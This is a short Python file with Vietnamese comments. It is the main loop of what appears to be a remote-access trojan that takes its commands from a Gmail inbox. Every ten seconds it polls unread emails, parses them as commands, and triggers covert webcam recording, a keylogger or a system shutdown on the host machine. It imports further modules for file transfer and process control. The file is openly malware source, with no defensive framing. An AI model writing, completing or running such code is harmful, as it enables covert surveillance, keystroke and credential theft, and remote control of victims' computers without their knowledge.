# main.py (ví dụ gọi lệnh từ Gmail)
from modules import gmail_api, webcam_recorder, keylogger, file_transfer, process_manager, system_control
import time

def handle_command(cmd):
    if "webcam" in cmd:
        duration = int(cmd.split()[-1])
        video_path = webcam_recorder.record_webcam(duration)
        # gọi hàm gửi file
    elif "keylogger" in cmd:
        keylogger.start_keylogger()
    elif "shutdown" in cmd:
        system_control.shutdown()
    # ... các lệnh khác

def main():
    service = gmail_api.authenticate()
    # Đọc email → Parse lệnh → gọi `handle_command()`
    while True:
        emails = gmail_api.get_unread_emails(service)
        for email in emails:
            cmd = gmail_api.parse_command(email)
            handle_command(cmd)
            gmail_api.mark_as_read(service, email['id'])
        time.sleep(10)  # Kiểm tra email mỗi 10 giây    
        